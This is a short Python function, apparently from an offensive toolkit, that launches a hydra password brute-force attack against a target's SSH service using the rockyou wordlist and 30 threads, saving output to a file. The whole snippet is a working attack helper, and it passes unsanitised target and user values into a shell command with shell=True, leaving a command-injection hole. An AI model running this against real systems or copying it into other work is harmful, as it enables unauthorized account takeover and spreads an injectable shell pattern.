import subprocess

def ssh_bf(target, user):
    command = f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} ssh -t 30 >> 22.txt"
    subprocess.call(command, shell=True)
